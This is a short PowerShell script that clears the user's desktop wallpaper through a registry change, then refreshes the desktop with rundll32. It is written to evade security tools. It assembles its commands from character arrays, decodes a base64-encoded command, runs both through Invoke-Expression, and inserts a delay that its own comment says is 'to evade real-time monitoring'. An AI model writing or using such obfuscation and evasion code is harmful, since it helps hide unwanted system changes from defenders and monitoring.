# Obfuscate strings using character arrays and joins
$a1 = [char[]]('H','K','C','U',':','\','C','o','n','t','r','o','l',' ','P','a','n','e','l','\','D','e','s','k','t','o','p') -join ''
$a2 = ([char[]]('S','e','t','-','I','t','e','m','P','r','o','p','e','r','t','y') -join '') -replace 'e','e' -replace 'S','s' -replace 'I','i' -replace 'P','p' -replace 'r','r'
$a3 = ([char[]]('W','a','l','l','p','a','p','e','r') -join '')

# Correct construction of command using double quotes correctly
$cmd = "$a2 -Path `"$a1`" -Name `"$a3`" -Value ''"

# Delay execution to evade real-time monitoring
Start-Sleep -Milliseconds 1000

# Executing the obfuscated command using Invoke-Expression
iex $cmd

# Obfuscate the refresh command using base64 and proper handling
$refreshCmd = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UlVORExMMzIuRVhFIFVTRVIzMi5ETEwsVXBkYXRlUGVyVXNlclN5c3RlbVBhcmFtZXRlcnM='))
iex $refreshCmd
